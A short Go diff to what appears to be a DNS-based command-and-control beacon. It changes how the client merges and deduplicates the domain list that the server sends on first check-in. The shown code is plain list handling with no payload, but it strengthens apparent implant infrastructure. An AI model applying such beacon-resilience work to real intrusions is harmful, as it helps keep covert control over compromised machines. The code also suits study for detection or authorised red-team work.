@@ -461,12 +461,56 @@ func (b *Beacon) runBeacon() {
 		// Check for DOMAINS response (sent on first check-in)
 		if strings.HasPrefix(response, "DOMAINS|") {
 			domainList := response[8:] // Skip "DOMAINS|"
-			domains := strings.Split(domainList, ",")
+			parts := strings.Split(domainList, ",")
+			var incoming []string
+			seen := make(map[string]bool)
+			for _, domain := range parts {
+				domain = strings.TrimSpace(domain)
+				if domain == "" || seen[domain] {
+					continue
+				}
+				incoming = append(incoming, domain)
+				seen[domain] = true
+			}
 
-			// Update domain list
 			b.client.mutex.Lock()
-			b.client.config.DNSDomains = domains
-			b.client.domainIndex = 0
+			existing := b.client.config.DNSDomains
+			merged := make([]string, 0, len(incoming)+len(existing))
+			seen = make(map[string]bool)
+			for _, domain := range incoming {
+				if !seen[domain] {
+					merged = append(merged, domain)
+					seen[domain] = true
+				}
+			}
+			for _, domain := range existing {
+				if !seen[domain] {
+					merged = append(merged, domain)
+					seen[domain] = true
+				}
+			}
+			if len(merged) == 0 && len(existing) > 0 {
+				merged = existing
+			}
+			if len(merged) > 0 {
+				b.client.config.DNSDomains = merged
+				if len(merged) > 0 {
+					b.client.domainIndex %= len(merged)
+				}
+				last := b.client.lastDomain
+				if last != "" {
+					stillPresent := false
+					for _, domain := range merged {
+						if domain == last {
+							stillPresent = true
+							break
+						}
+					}
+					if !stillPresent {
+						b.client.lastDomain = ""
+					}
+				}
+			}
 			b.client.mutex.Unlock()
 
 			// Continue to next check-in cycle
